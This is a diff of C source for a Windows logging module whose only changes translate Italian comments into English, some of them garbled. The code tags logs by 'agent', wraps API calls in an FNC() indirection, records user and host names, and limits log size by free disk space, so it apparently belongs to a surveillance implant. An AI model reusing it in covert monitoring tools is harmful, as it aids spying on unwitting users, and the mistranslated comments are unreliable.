@@ -272,14 +272,14 @@ void LOG_InitSequentialLogs()
 {
 	DWORD i;
 
-	// Inizializza la tabella dei log
+    // Initializes the table of log
 	for (i=0; i<MAX_LOG_ENTRIES; i++) {
 		log_table[i].agent_tag = NO_TAG_ENTRY;
 		log_table[i].h_file = INVALID_HANDLE_VALUE;
 	}
 }
 
-// Inizializza l'utilizzo dei log
+// Initializes the use of log
 void LOG_InitLog()
 {
 	ULARGE_INTEGER temp_free_space;
@@ -290,26 +290,24 @@ void LOG_InitLog()
 
 	log_active_queue = 0;
 
-	// Legge la configurazione dei log
+    // Reads the configuration of the log
 	UpdateLogConf();
 
 	LOG_InitSequentialLogs();
 
-	// Inizializza lo spazio rimanente sul disco
-	// dove e' la directory di lavoro
+    // Initializes the remaining space on disk and where 'the working directory
 	// (min disk free)
 	if (FNC(GetDiskFreeSpaceExA)(HM_CompletePath("", disk_path), NULL, NULL, &temp_free_space))
 		allowed_size1 = LOG_CalcSpace(&temp_free_space, min_disk_free);	
 
-	// Inizializza lo spazio ancora a disposizione per i log
+    // Initializes the space still available for logs
 	// (max disk full)
 	temp_log_space = LOG_GetActualLogSize();
 	if (max_disk_full >= temp_log_space)
 		allowed_size2 = max_disk_full - temp_log_space;
 
-	// Lo spazio libero e' la condizione piu' stringente
-	// fra le due sopra
-	// (se qualcosa va storto log_free_space = 0)
+    //Free space and 'the condition more' stringent of the two above 
+    //(if something goes wrong log_free_space = 0)
 	if (allowed_size1 < allowed_size2)
 		log_free_space = allowed_size1;
 	else
@@ -317,8 +315,8 @@ void LOG_InitLog()
 }
 
 
-// Crea l'header per il nuovo formato di log
-// l'header poi va LIBERATO!
+// Create the header for the new log format
+// the header then goes RELEASED!
 BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_len, DWORD *out_len)
 {
 	FILETIME tstamp;
@@ -333,7 +331,7 @@ BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_
 	if (out_len)
 		*out_len = 0;
 
-	// Calcola i campi da mettere nell'header
+    // Calculate fields to put the header
 	memset(user_name, 0, sizeof(user_name));
 	memset(host_name, 0, sizeof(host_name));
 	user_name[0]=L'-';
@@ -342,7 +340,7 @@ BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_
 	FNC(GetEnvironmentVariableW)(L"COMPUTERNAME", (WCHAR *)host_name, sizeof(host_name)/2-2);
 	FNC(GetSystemTimeAsFileTime)(&tstamp);
 
-	// Riempie l'header
+    // Fills the header
 	log_header.uDeviceIdLen = wcslen(host_name)*sizeof(WCHAR);
 	log_header.uUserIdLen   = wcslen(user_name)*sizeof(WCHAR);
 	log_header.uSourceIdLen = 0;
@@ -355,7 +353,7 @@ BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_
 	log_header.uLTimestamp = tstamp.dwLowDateTime;
 	log_header.uLogType = agent_tag;
 
-	// Calcola la lunghezza totale dell'header e il padding
+    // It calculates the total length of the header and the padding
 	header_len = sizeof(LogStruct) + log_header.uDeviceIdLen + log_header.uUserIdLen + log_header.uSourceIdLen + log_header.uAdditionalData;
 	padded_len = header_len;
 	if (padded_len % BLOCK_LEN) {
